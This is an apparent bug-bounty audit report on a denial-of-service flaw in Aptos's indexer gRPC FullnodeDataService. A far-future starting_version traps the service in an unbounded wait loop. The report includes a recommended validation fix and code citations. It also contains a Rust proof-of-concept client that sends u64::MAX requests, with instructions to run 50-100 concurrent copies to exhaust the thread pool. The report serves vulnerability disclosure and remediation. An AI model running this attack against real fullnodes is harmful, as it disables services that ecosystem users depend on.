# Audit Report

## Title
FullnodeDataService DoS via Unvalidated Future Version Requests

## Summary
The FullnodeDataService does not validate that `starting_version` in `GetTransactionsFromNodeRequest` is within a reasonable range before processing. When a client requests a far future transaction version, the service enters an unbounded wait loop that indefinitely ties up tokio runtime resources, enabling a Denial of Service attack.

## Finding Description
The `GetTransactionsRequest` struct in the indexer gRPC protocol allows clients to specify a `starting_version` for transaction streaming. [1](#0-0) 

The FullnodeDataService accepts this request and only validates that `starting_version` is present, but does not check if the requested version is within a reasonable range of the current blockchain height. [2](#0-1) 

When processing transactions, the `IndexerStreamCoordinator` calls `ensure_highest_known_version()`, which enters a loop that waits while `current_version > highest_known_version`. [3](#0-2) 

This loop has no timeout or maximum iteration count. Each iteration sleeps for 100ms and checks if the blockchain has caught up to the requested version. [4](#0-3) 

**Attack Propagation:**
1. Attacker sends `GetTransactionsFromNodeRequest` with `starting_version = u64::MAX` or other far future value
2. Service spawns tokio task and creates `IndexerStreamCoordinator` without validating the version
3. Coordinator calls `process_next_batch()` → `fetch_transactions_from_storage()` → `get_batches()` → `ensure_highest_known_version()`
4. The wait loop executes indefinitely, sleeping 100ms per iteration, waiting for the blockchain to reach the impossible future version
5. The tokio task is never released, consuming runtime resources
6. Multiple such requests exhaust the tokio thread pool, preventing legitimate requests from being processed

**Broken Invariant:** This violates the "Resource Limits" invariant stating "All operations must respect gas, storage, and computational limits." The service fails to limit the computational resources consumed by processing a malicious request.

**Comparison with Protected Services:**
The LiveDataService implements proper protection by rejecting requests where `starting_version > known_latest_version + 10000`. [5](#0-4) 

The HistoricalDataService also has protection by checking `can_serve()` and gracefully terminating streams for unavailable versions. [6](#0-5) 

## Impact Explanation
This is a **Medium Severity** vulnerability per Aptos bug bounty criteria as it causes service unavailability. Specifically:
- Each malicious request indefinitely ties up one tokio task in the runtime thread pool
- An attacker can send multiple concurrent requests to exhaust all available threads
- This prevents the FullnodeDataService from processing legitimate transaction streaming requests
- The service becomes unavailable but does not affect consensus, validator operations, or funds

While categorized as Medium, this represents a significant availability impact as the indexer gRPC fullnode service is critical infrastructure for blockchain explorers, indexers, and other ecosystem applications that rely on transaction data access.

## Likelihood Explanation
**Likelihood: HIGH**

The vulnerability is trivially exploitable:
- No authentication or special privileges required if the gRPC endpoint is exposed
- Attack requires only a single malformed gRPC request with a high `starting_version` value
- Can be scripted and automated to send multiple concurrent requests
- No rate limiting or request validation prevents the attack
- The attacker doesn't need deep protocol knowledge, just basic gRPC client usage

The attack has low complexity and can be executed by any malicious actor with network access to the service.

## Recommendation
Add validation before creating the `IndexerStreamCoordinator` to reject requests for versions that are unreasonably far in the future: [2](#0-1) 

**Recommended fix:**
```rust
let starting_version = match r.starting_version {
    Some(version) => {
        // Get current ledger version
        let ledger_info = context.get_latest_ledger_info()
            .map_err(|e| Status::internal(format!("Failed to get ledger info: {}", e)))?;
        let current_version = ledger_info.version();
        
        // Reject requests for versions too far in the future (e.g., > 10000 ahead)
        const MAX_VERSION_AHEAD: u64 = 10000;
        if version > current_version.saturating_add(MAX_VERSION_AHEAD) {
            return Err(Status::failed_precondition(
                format!("starting_version {} is too far ahead of current version {}. Maximum allowed: {}",
                    version, current_version, current_version + MAX_VERSION_AHEAD)
            ));
        }
        version
    },
    None => return Err(Status::invalid_argument("Starting version must be set")),
};
```

Additionally, consider adding a timeout mechanism in `ensure_highest_known_version()` to prevent indefinite waiting even for edge cases.

## Proof of Concept
```rust
// PoC: Rust client that demonstrates the DoS attack
use aptos_protos::internal::fullnode::v1::{
    fullnode_data_client::FullnodeDataClient, 
    GetTransactionsFromNodeRequest
};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to the FullnodeDataService
    let mut client = FullnodeDataClient::connect("http://fullnode:50051").await?;
    
    // Create malicious request with far future version
    let malicious_request = GetTransactionsFromNodeRequest {
        starting_version: Some(u64::MAX), // Request impossible future version
        transactions_count: None, // Stream indefinitely
    };
    
    // Send request - this will cause the service to wait indefinitely
    // Each concurrent call ties up one tokio task
    let mut stream = client
        .get_transactions_from_node(Request::new(malicious_request))
        .await?
        .into_inner();
    
    // The service is now stuck in ensure_highest_known_version() loop
    // Repeat this 50-100 times concurrently to exhaust the thread pool
    println!("Attack initiated. Service task is now blocked indefinitely.");
    
    // Keep connection alive to maintain resource consumption
    while let Some(_response) = stream.message().await? {
        // This loop will never execute as service is stuck waiting
    }
    
    Ok(())
}
```

**Test Steps:**
1. Deploy Aptos fullnode with indexer gRPC service enabled
2. Run the above PoC client multiple times concurrently (50-100 instances)
3. Observe that legitimate requests to the FullnodeDataService time out or fail
4. Monitor tokio runtime metrics showing thread pool exhaustion
5. Service requires restart to recover

**Notes**

This vulnerability specifically affects the FullnodeDataService in the indexer-grpc-fullnode component, not the core consensus or blockchain logic. However, it represents a significant availability issue for ecosystem infrastructure that depends on transaction data access. The fix should align with the existing protections already implemented in LiveDataService and HistoricalDataService.

The unbounded wait loop violates defensive programming principles and resource management best practices. While the abort_handle mechanism exists for service shutdown, it does not protect against per-request resource exhaustion from malicious clients.

### Citations

**File:** protos/rust/src/pb/aptos.indexer.v1.rs (L121-136)
```rust
pub struct GetTransactionsRequest {
    /// Required; start version of current stream.
    #[prost(uint64, optional, tag="1")]
    pub starting_version: ::core::option::Option<u64>,
    /// Optional; number of transactions to return in current stream.
    /// If not present, return an infinite stream of transactions.
    #[prost(uint64, optional, tag="2")]
    pub transactions_count: ::core::option::Option<u64>,
    /// Optional; number of transactions in each `TransactionsResponse` for current stream.
    /// If not present, default to 1000. If larger than 1000, request will be rejected.
    #[prost(uint64, optional, tag="3")]
    pub batch_size: ::core::option::Option<u64>,
    /// If provided, only transactions that match the filter will be included.
    #[prost(message, optional, tag="4")]
    pub transaction_filter: ::core::option::Option<BooleanTransactionFilter>,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L73-78)
```rust
        let starting_version = match r.starting_version {
            Some(version) => version,
            // Live mode unavailable for FullnodeDataService
            // Enable use_data_service_interface in config to use LocalnetDataService instead
            None => return Err(Status::invalid_argument("Starting version must be set")),
        };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L550-579)
```rust
    async fn ensure_highest_known_version(&mut self) -> bool {
        let mut empty_loops = 0;
        while self.highest_known_version == 0 || self.current_version > self.highest_known_version {
            if let Some(abort_handle) = self.abort_handle.as_ref() {
                if abort_handle.load(Ordering::SeqCst) {
                    return false;
                }
            }
            if empty_loops > 0 {
                tokio::time::sleep(Duration::from_millis(RETRY_TIME_MILLIS)).await;
            }
            empty_loops += 1;
            if let Err(err) = self.set_highest_known_version() {
                error!(
                    error = format!("{:?}", err),
                    "[Indexer Fullnode] Failed to set highest known version"
                );
                continue;
            } else {
                sample!(
                    SampleRate::Frequency(10),
                    info!(
                        highest_known_version = self.highest_known_version,
                        "[Indexer Fullnode] Found new highest known version",
                    )
                );
            }
        }
        true
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L32-32)
```rust
pub const RETRY_TIME_MILLIS: u64 = 100;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L86-96)
```rust
                if starting_version > known_latest_version + 10000 {
                    let err = Err(Status::failed_precondition(
                        "starting_version cannot be set to a far future version.",
                    ));
                    info!("Client error: {err:?}.");
                    let _ = response_sender.blocking_send(err);
                    COUNTER
                        .with_label_values(&["live_data_service_requested_data_too_new"])
                        .inc();
                    continue;
                }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L158-161)
```rust
            if !self.file_store_reader.can_serve(next_version).await {
                info!(stream_id = id, "next_version {next_version} is larger or equal than file store version, terminate the stream.");
                break;
            }
```
